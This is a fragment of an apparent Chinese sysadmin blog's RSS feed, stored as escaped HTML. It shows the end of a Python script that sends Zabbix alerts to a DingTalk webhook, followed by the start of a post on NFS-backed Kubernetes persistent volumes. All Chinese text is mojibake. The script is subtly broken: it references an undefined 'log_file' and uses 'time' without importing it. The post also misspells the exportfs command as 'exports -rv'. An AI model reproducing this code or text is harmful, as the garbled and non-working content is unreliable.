&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;datetime&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è¯´æ˜ï¼šè¿™é‡Œæ”¹ä¸ºè‡ªå·±åˆ›å»ºçš„æœºå™¨äººçš„webhook&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;webhook&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx&amp;#34;&lt;/span&gt;     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isfile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/tmp/dingding.log&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;a+&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;w+&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;json_text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;msgtype&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;markdown&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;markdown&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;s2&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;zabbix monitor&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;s2&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;at&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;s2&#34;&gt;&amp;#34;atMobiles&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;s2&#34;&gt;&amp;#34;isAtAll&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;webhook&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dumps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json_text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;errcode&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strftime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%Y-%m-&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; %H:%M:%S&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;localtime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;:æ¶ˆæ¯å‘é€æˆåŠŸ è¿”å›ç :&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;:æ¶ˆæ¯å‘é€å¤±è´¥ è¿”å›ç :&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#ç”¨æˆ·&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;subject&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#æ ‡é¢˜&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#æ¶ˆæ¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬æŠŠä¸Šé¢çš„æ–‡ä»¶å†…å®¹æ”¾åˆ° /usr/lib/zabbix/alertscripts ç›®å½•ä¸‹ï¼Œåå­—å°±å«åš dingding.py ï¼Œåªèƒ½æ˜¯è¿™ä¸ªç›®å½•ï¼Œå› ä¸ºè¿™æ˜¯ zabbix ç¼ºçœå¤–æŒ‚è„šæœ¬æ–‡ä»¶çš„ç›®å½•ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>kubernetesä½¿ç”¨nfsåšæŒä¹…åŒ–å·å­˜å‚¨</title>
      <link>https://rendoumi.com/posts/20221124-k8s_nfs/</link>
      <pubDate>Thu, 24 Nov 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221124-k8s_nfs/</guid>
      <description>&lt;p&gt;ç”¨NFSæ¥åškubernetesçš„æŒä¹…åŒ–å·è™½ç„¶ä¸æ˜¯æœ€ä½³å®è·µï¼Œä½†å­˜åœ¨å³åˆç†ã€‚åœ¨ç°åœ¨çš„å…¬å¸å°±æ˜¯è¿™ä¹ˆç”¨çš„ï¼Œè®°å½•ä¸€ä¸‹ï¼Œå¯ç”¨ä½†ä¸æ˜¯æœ€ä½³ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä¸€æ­å»ºnfsæœåŠ¡ç«¯å’Œæ‰€æœ‰å·¥ä½œèŠ‚ç‚¹å®‰è£…å®¢æˆ·ç«¯&#34;&gt;ä¸€ã€æ­å»ºNFSæœåŠ¡ç«¯å’Œæ‰€æœ‰å·¥ä½œèŠ‚ç‚¹å®‰è£…å®¢æˆ·ç«¯&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#NFSæœåŠ¡ç«¯ (centos7)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install nfs-utils rpcbind -y
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /data/nfs/&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;download,bakup,www&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/data/nfs 10.10.0.0/16(rw,all_squash,insecure,sync)&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/exports
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exportfs -r
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; rpcbind nfs-server
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl restart rpcbind nfs-server
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;showmount -e localhost
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å®¢æˆ·ç«¯æ ¹æœ¬ä¸è£…ä¹Ÿå¯ä»¥ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦å¯åŠ¨ä»»ä½•nfsæœåŠ¡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åªæ˜¯ä¸ºäº†ä½¿ç”¨showmountå·¥å…·æ¥éªŒè¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#NFSå®¢æˆ·ç«¯ï¼ˆCentOSï¼Œæ‰€æœ‰WorkNodeèŠ‚ç‚¹éƒ½éœ€è¦æ‰§è¡Œï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install -y nfs-utils
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#NFSå®¢æˆ·ç«¯ï¼ˆUbuntuï¼Œæ‰€æœ‰WorkNodeèŠ‚ç‚¹éƒ½éœ€è¦æ‰§è¡Œï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install -y nfs-common
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NFS æœåŠ¡ç«¯çš„å‚æ•°å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;rw èƒ½è¯»èƒ½å†™&lt;/li&gt;
&lt;li&gt;insecure NFSé€šè¿‡1024ä»¥ä¸Šçš„ç«¯å£å‘é€&lt;/li&gt;
&lt;li&gt;root_squash rootä¼šè¢«å˜æˆnobobyï¼Œå…¶ä»–äººä¸å˜&lt;/li&gt;
&lt;li&gt;no_root_squash rootèº«ä»½ä¿æŒä¸å˜ï¼Œå…¶ä»–äººä¸å˜ã€‚ï¼ˆä¸èƒ½ç”¨è¿™ä¸ªï¼Œå®¹æ˜“è¢«é»‘ï¼‰&lt;/li&gt;
&lt;li&gt;all_squash ä¸è®ºç™»å…¥NFSçš„ä½¿ç”¨è€…èº«ä»½ä¸ºä½•ï¼Œä»–çš„èº«ä»½éƒ½ä¼šè¢«å‹ç¼©æˆä¸ºåŒ¿åä½¿ç”¨è€…ï¼Œé€šå¸¸ä¹Ÿå°±æ˜¯nobody&lt;/li&gt;
&lt;li&gt;sync æ•°æ®ç›´æ¥è½ç›˜ï¼Œæ€§èƒ½ç•¥æŸã€‚&lt;/li&gt;
&lt;li&gt;async æ•°æ®å…ˆè½å†…å­˜ï¼Œç„¶åè½ç›˜ï¼Œæ€§èƒ½ç•¥å‡ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç»¼ä¸Šï¼Œä¿é™©çš„å‚æ•°å°±æ˜¯&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/data/nfs 10.10.0.0/16(rw,insecure,all_squash,sync)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ³¨æ„ï¼šä¿®æ”¹äº†/etc/exportsåï¼Œå¹¶ä¸éœ€è¦é‡å¯nfsæœåŠ¡ï¼Œåªè¦ç”¨exportfsé‡æ–°æ‰«æä¸€æ¬¡/etc/exportsï¼Œå¹¶ä¸”é‡æ–°åŠ è½½å³å¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exports -rv
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;äºŒpodå†…ç›´æ¥ä½¿ç”¨&#34;&gt;äºŒã€PODå†…ç›´æ¥ä½¿ç”¨&lt;/h4&gt;
&lt;p&gt;ç”±äºnfsæ˜¯å†…æ ¸è‡ªå¸¦çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æœ€ç®€å•çš„ä½¿ç”¨æ–¹æ³•å°±æ˜¯ç›´æ¥åœ¨podå†…ä½¿ç”¨&lt;/p&gt;
